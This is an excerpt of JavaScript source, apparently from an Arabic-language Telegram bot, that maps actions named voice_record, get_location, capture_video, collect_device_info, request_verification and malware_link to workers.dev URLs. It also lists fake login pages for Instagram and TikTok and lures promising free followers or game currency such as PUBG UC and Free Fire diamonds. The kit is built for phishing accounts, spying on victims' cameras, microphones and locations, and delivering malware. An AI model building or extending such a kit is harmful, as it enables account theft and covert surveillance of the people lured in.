...
function showDefaultButtons(userId) {
  ...
  let defaultButtons = [
    ...
    [
      ...
      { text: '📱 بوت المميزات المجاني', url: 'https://t.me/HHH1Dbot' }
    ],
    [
...
let hackLinks = {
    ...
    voice_record: 'https://sh.rwks332.workers.dev/voice',
    
    
    request_verification: 'https://t.rwks332.workers.dev/whatsapp',
    
    
    malware_link: 'little.rwks332.workers.dev/malware',
    
   
    collect_device_info: 'https://quiet.rwks332.workers.dev/phone',
    
    
    get_location: 'https://calm.rwks332.workers.dev/local',
    
    
    capture_video: 'https://squ.rwks332.workers.dev/video'
};
...
let pageLinks = {
    // روابط تسجيل الدخول
    login: {
        instagram: 'https://plain-river-0b2a.rwks332.workers.dev/Instagram',
        tiktok: 'https://luck.rwks332.workers.dev/tiktok',
        youtube: 'ikfkfk',
    ...
    increase: {
        instagram: 'https://sweet-ba.rwks332.workers.dev/insta',
        tiktok: 'https://red-fire.rwks332.workers.dev/tik',
        youtube: 'https://fanc.rwks332.workers.dev/yot',
        snapchat: 'https://orang.rwks332.workers.dev/snap',
        twitter: 'https://gree7.rwks332.workers.dev/twitter',
        facebook: 'https://squar5.rwks332.workers.dev/face'
    },
    // روابط الألعاب
    games: {
        pubg_uc: 'https://old-bi.rwks332.workers.dev/bobji',
        free_fire_diamonds: 'https://fanco.rwks332.workers.dev/free',
        toptop_coins: 'https://rapid.rwks332.workers.dev/top'
    }
};
